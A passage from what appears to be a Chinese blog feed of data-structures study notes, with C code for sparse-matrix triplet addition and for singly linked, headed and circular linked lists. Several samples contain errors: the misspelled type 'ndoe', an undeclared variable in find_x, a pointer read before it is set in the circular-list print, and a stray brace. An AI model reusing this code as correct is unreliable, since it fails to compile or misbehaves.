class="keyword">while</span>(i&lt;=a[<span class="number">0</span>][<span class="number">2</span>]&amp;&amp;j&lt;=b[<span class="number">0</span>][<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>] &lt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>]&lt;b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">             c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">             c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">             c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">             i++;k++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] &gt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>] &gt; b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">                c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">                c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">                c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">                j++;k++;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; (a[i][<span class="number">1</span>] == b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">            c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>]; </span><br><span class="line">            c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">            c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>]+b[j][<span class="number">2</span>];</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(c[k][<span class="number">2</span>] != <span class="number">0</span>) k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= b[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">        j++;k++; </span><br><span class="line">    &#125;</span><br><span class="line"> 	<span class="keyword">while</span>(i &lt;= a[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">        i++;k++; </span><br><span class="line">    &#125;</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">1</span>]=a[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">2</span>]=k<span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将普通矩阵存储转换成 三元组 的 存储结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_matrix</span><span class="params">(matrix *A,spmatrix B)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; A-&gt;m; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; A-&gt;n; j++)</span><br><span class="line">            <span class="keyword">if</span>(A-&gt;data[i][j] != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                B[k][<span class="number">0</span>] = i;</span><br><span class="line">                B[k][<span class="number">1</span>] = j;</span><br><span class="line">                B[k][<span class="number">2</span>] = A-&gt;data[i][j];</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">0</span>] = A-&gt;m;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">1</span>] = A-&gt;n;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">2</span>] = k<span class="number">-1</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;三元组矩阵 展示：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= B[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%5d%5d\n&quot;</span>,B[i][<span class="number">0</span>],B[i][<span class="number">1</span>],B[i][<span class="number">2</span>]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">int</span> r,<span class="keyword">int</span> w,matrix *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入数据：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;w;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">            s-&gt;data[i][j] = data;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;矩阵展示：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;w;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,s-&gt;data[i][j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    s-&gt;m = r;</span><br><span class="line">    s-&gt;n = w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    matrix p,q;</span><br><span class="line">    spmatrix a,b,c;</span><br><span class="line">    <span class="keyword">int</span> r,w,i;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入矩阵的 行 与 列：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;r,&amp;w);</span><br><span class="line">    create(r,w,&amp;p);</span><br><span class="line">    create(r,w,&amp;q);</span><br><span class="line">    change_matrix(&amp;p,a);</span><br><span class="line">    change_matrix(&amp;q,b);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    add(a,b,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行加法运算后的 三元组矩阵 展示：\n&quot;</span>); </span><br><span class="line">    <span class="keyword">while</span>(i &lt;= c[<span class="number">0</span>][<span class="number">2</span>])&#123; </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%d%5d%5d\n&quot;</span>,c[i][<span class="number">0</span>],c[i][<span class="number">1</span>],c[i][<span class="number">2</span>]);</span><br><span class="line">     	 i++;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/22/9rquXIPgvZ8wTYm.png" alt="image-20211022203244329"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>线性表的链式存储</title>
    <url>/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h2 id="线性表的链式存储"><a href="#线性表的链式存储" class="headerlink" title="线性表的链式存储"></a>线性表的链式存储</h2><p>线性表的存储方式：顺序存储 、链式存储</p>
<p>单链表  带头结点的单链表  循环单链表  双链表  特殊的线性表–栈和队列 的 链式存储实现</p>
<p>链式存储：指针 体现结点之间的逻辑关系  info   next</p>
<p><img src="https://i.loli.net/2021/09/25/o8ihcCZxbRSAPQ4.png" alt="image-20210925132250254"></p>
<hr>
<h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>结点包含 两个域：info域    next 指针域</p>
<p>必须含有一个首指针 指向单链表中的第一个结点  head</p>
<p><img src="https://i.loli.net/2021/09/25/3pCOcuU62fDqEWI.png" alt="image-20210925132456231"></p>
<h4 id="单链表的创建"><a href="#单链表的创建" class="headerlink" title="单链表的创建"></a>单链表的创建</h4><p><strong>前插法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat_first</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>尾插法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="单链表的操作"><a href="#单链表的操作" class="headerlink" title="单链表的操作"></a>单链表的操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立一个空的链表</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找值是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_x</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != x)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 第 i 个结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_i</span><span class="params">(node *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j  = <span class="number">1</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;\nError!&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i!=j)</span><br><span class="line">    &#123;p = p-&gt;next;j++;&#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入 值为 x 的结点作为单链表的第一个结点  </span></span><br><span class="line"><span class="function">node *<span class="title">insert_begin</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = head;</span><br><span class="line">    head = p;  <span class="comment">//p 现在是第一个结点，头 head 换成 p</span></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在单链表 第 i 个结点之后插入一个值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert_medium</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    q = find_i(head,i);<span class="comment">//查找第 i 个结点</span></span><br><span class="line">    <span class="keyword">if</span>(!q)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到第 i 个结点，不能进行插入！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在单链表最后位置插入结点 x</span></span><br><span class="line"><span class="function">node *<span class="title">insert_last</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    node *q;</span><br><span class="line">    q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)&#123;  <span class="comment">//找到最后一个结点的位置，最后一个结点的 next 是 NULL</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;next = q;</span><br><span class="line">    q-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除单链表 结点</span></span><br><span class="line"><span class="function">node *<span class="title">delete_begin</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *pre = <span class="literal">NULL</span>,*p;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != x)&#123; <span class="comment">//如果删除的是中间的 用 pre 指向 p 原本的位置</span></span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!pre &amp;&amp; p-&gt;info == x)&#123; <span class="comment">//需要删除的是 第一个 结点</span></span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pre-&gt;next = p-&gt;next; <span class="comment">//需要删除的是 中间的 结点</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链式存储 的插入与删除 比 顺序表方便，但不能随机去访问 某个结点</p>
<p>插入判满，删除判空！！！！！！！1</p>
<h3 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h3><p><img src="https://i.loli.net/2021/09/28/JTnbN5DRBp3eHLv.png" alt="image-20210928161355054"></p>
<h4 id="带头结点的单链表创建"><a href="#带头结点的单链表创建" class="headerlink" title="带头结点的单链表创建"></a>带头结点的单链表创建</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">	datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="带头结点的单链表操作"><a href="#带头结点的单链表操作" class="headerlink" title="带头结点的单链表操作"></a>带头结点的单链表操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head;</span><br><span class="line">    head = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找第 i 个结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_i</span><span class="params">(node *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">0</span>) </span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点！\n&quot;</span>,i);  <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>)  <span class="comment">//刚好为头结点 由于是带头结点的单链表，则为 NULL</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i!=j)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作 在 第 i 个 结点之后插入 x</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    q = find_i(head,i);</span><br><span class="line">    <span class="keyword">if</span>(!q) &#123;<span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点！\n&quot;</span>,i); <span class="keyword">return</span> head;&#125;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    ndoe *pre = head,*q;</span><br><span class="line">    q = head-&gt;next;  <span class="comment">//由于是带头结点</span></span><br><span class="line">    <span class="keyword">while</span>(q &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        pre = q;   <span class="comment">//使 pre 始终指向 p 的前驱</span></span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q)&#123;</span><br><span class="line">        pre-&gt;next = q-&gt;next;  <span class="comment">//删除</span></span><br><span class="line">        <span class="built_in">free</span>(q);   			  <span class="comment">//释放空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><p>如果仅仅是单链表的话，它只能从首指针开始，依次向后访问，而不能访问到它前面的结点，如果想要访问到任意的结点的话——&gt;循环单链表。</p>
<p>做法：设置表最后一个结点的指针域指向表中的第一个结点。</p>
<p>假设最后一个结点的位置是 p ，则 p-&gt;next = head;</p>
<h4 id="循环单链表的操作"><a href="#循环单链表的操作" class="headerlink" title="循环单链表的操作"></a>循环单链表的操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得 循环单链表 最后一个结点的 存储地址</span></span><br><span class="line"><span class="function">node *<span class="title">rear</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        p = <span class="literal">NULL</span>; <span class="comment">//循环单链表 为空</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next != head)</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表是空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);  		<span class="comment">//输出非空表中的 第一个 结点的值</span></span><br><span class="line">        p = head-&gt;next;					<span class="comment">//使 p 指向第一个结点的下一个结点</span></span><br><span class="line">        <span class="keyword">while</span>(p != head)&#123;				<span class="comment">//输出中间的结点值，直到回到第一个结点</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找 值 是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_x</span><span class="params">(ndoe *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环单链表是 空的 ！\n&quot;</span>); <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;info == x)</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q,*myrear;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找不到指定位置！\n&quot;</span>);&#125;</span><br><span class="line">    	<span class="built_in">free</span>(p);</span><br><span class="line">    	<span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; !head)&#123;		<span class="comment">//插入之前循环单链表是空的，则插入后指针应指向自己</span></span><br><span class="line">        p-&gt;next = p;</span><br><span class="line">        head = p;</span><br><span class="line">        <span class="keyword">return</span> head; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; head)&#123;			<span class="comment">//在非空的 循环单链表中  插入 到 最前面</span></span><br><span class="line">        myrear = rear(head);	<span class="comment">//寻找 最后一个结点</span></span><br><span class="line">        p-&gt;next = head;			<span class="comment">//将 p 作为 最后一个结点</span></span><br><span 